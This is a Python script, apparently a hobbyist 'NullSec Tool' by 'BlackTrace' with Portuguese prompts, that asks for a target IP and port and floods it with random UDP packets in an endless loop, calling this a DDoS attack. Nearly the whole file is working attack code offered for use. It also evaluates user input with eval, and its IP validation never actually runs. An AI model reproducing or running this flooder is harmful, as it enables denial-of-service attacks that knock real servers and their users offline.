import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

from datetime import datetime
agora = datetime.now()
hora = agora.hour
minuto = agora.minute
dia = agora.day
mes = agora.month
ano = agora.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print('''
    ************************************************
    *   _  _ _   _ _     _  _  _ ___ ___ ___       *
    *  | \| | | | | |   | \| |/ _ \ __| __| |      *
    *  | .` | |_| | |__ | .` | (_) \__ \ _|| |__   *
    *  |_|\_|\___/|____||_|\_|\___/|___/___|____|  *
    *                                              *
    *                NullSec Tool                  *
    *             BY: BlackTrace                   *
    *                                              *
    ************************************************
''')
ip = input(" [+] De um IP de destino: ")
port = eval(input(" [+] Porta de partida NO : "))
os.system("clear")
print('''
    ************************************************
    *   _  _ _   _ _     _  _  _ ___ ___ ___       *
    *  | \| | | | | |   | \| |/ _ \ __| __| |      *
    *  | .` | |_| | |__ | .` | (_) \__ \ _|| |__   *
    *  |_|\_|\___/|____||_|\_|\___/|___/___|____|  *
    *                                              *
    *                NullSec Tool                  *
    *             Author: BlackTrace               *
    *                                              *
    ************************************************
''')
try:
	validar = ip
	print(" ✅ IP válido verificado... ")
	print(" [+] Carregando tela de ataque...")
except ValidationError as exception :
	print(" ✘ Insira uma URL valida")

print(" ")
print(" Esse é meu segredo, estou sempre bravo ")
print(" " )
print(" [+] NullSec está atacando o servidor " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C detectado.........Saindo")
	print(" [-] ATAQUE DDOS INTERROMPIDO")
input(" Enter To Exit")
os.system("clear")
print(" [-] Dr. Banner is tired...")
time.sleep(2)
